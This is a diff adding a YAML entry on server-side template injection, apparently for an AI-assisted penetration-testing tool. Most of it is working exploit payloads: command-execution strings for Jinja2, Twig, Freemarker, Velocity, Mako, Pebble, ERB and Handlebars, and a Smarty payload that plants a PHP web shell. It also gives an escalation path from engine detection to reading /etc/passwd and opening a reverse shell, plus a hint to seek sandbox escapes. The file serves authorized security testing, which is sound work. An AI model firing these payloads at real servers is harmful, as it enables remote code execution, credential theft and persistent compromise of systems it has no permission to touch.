@@ -1,0 +1,77 @@
+id: SSTI
+name: Server-Side Template Injection
+cwe:
+- CWE-1336
+owasp: A03:2021 Injection
+severity_range: High - Critical
+description: User input is embedded into server-side templates and evaluated, potentially allowing remote code execution.
+detection:
+  payloads:
+    polyglot_detection:
+    - ${{<%[%'"}}%\.
+    - '{{7*7}}'
+    - ${7*7}
+    - <%= 7*7 %>
+    - '#{7*7}'
+    - '{7*7}'
+    - '{{7*''7''}}'
+    jinja2:
+    - '{{7*7}}'
+    - '{{config}}'
+    - '{{self.__class__.__mro__}}'
+    - '{{''''.__class__.__mro__[1].__subclasses__()}}'
+    - '{{request.application.__globals__.__builtins__.__import__(''os'').popen(''id'').read()}}'
+    - '{% for x in ().__class__.__base__.__subclasses__() %}{% if ''warning'' in x.__name__ %}{{x()._module.__builtins__[''__import__''](''os'').popen(''id'').read()}}{%
+      endif %}{% endfor %}'
+    twig:
+    - '{{7*7}}'
+    - '{{_self.env.registerUndefinedFilterCallback(''exec'')}}{{_self.env.getFilter(''id'')}}'
+    freemarker:
+    - ${7*7}
+    - <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+    velocity:
+    - '#set($x=7*7)${x}'
+    - '#set($rt=$class.forName(''java.lang.Runtime''))#set($proc=$rt.getRuntime().exec(''id''))'
+    smarty:
+    - '{php}echo `id`;{/php}'
+    - '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[''cmd'']); ?>",self::clearConfig())}'
+    mako:
+    - ${7*7}
+    - <%import os%>${os.popen('id').read()}
+    pebble:
+    - '{{7*7}}'
+    - '{% set cmd = ''id'' %}{% set bytes = (1).TYPE.forName(''java.lang.Runtime'').methods[6].invoke(null,null).exec(cmd)
+      %}'
+    erb:
+    - <%= 7*7 %>
+    - <%= system('id') %>
+    - <%= `id` %>
+    handlebars:
+    - '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with
+      string.split as |codelist|}}{{this.pop}}{{this.push "return require(''child_process'').execSync(''id'');"}}{{this.pop}}{{#each
+      conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}'
+  strategy:
+  - 1. Inject {{7*7}} and ${7*7} and <%= 7*7 %> in all inputs
+  - 2. If response contains '49', template injection confirmed
+  - 3. Identify the template engine using engine-specific probes
+  - '4. Jinja2: {{config}} returns Flask config object'
+  - '5. Twig: {{_self}} returns template info'
+  - '6. Freemarker: ${.version} returns version'
+  - 7. Use engine-specific RCE payloads for escalation
+  - 8. Test email templates, PDF generators, error pages, preview features
+escalation:
+  path: detect_engine → confirm_execution → read_file → rce
+  rce_confirmation: Execute 'id' or 'whoami' and verify output in response
+  file_read: Read /etc/passwd or application config files
+  reverse_shell: Establish reverse shell via os.popen or Runtime.exec
+evidence_needed: 'Server-side code execution proof: math evaluation (49 for 7*7), file content, or command output in response'
+ai_research_hints:
+- Check PDF generation endpoints — they often use templates
+- Test email template preview/customization features
+- Look for 'preview' or 'render' parameters in URLs
+- Test error pages that might reflect input through templates
+- Check if template sandbox is enforced and find sandbox escapes
+references:
+- https://portswigger.net/web-security/server-side-template-injection
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
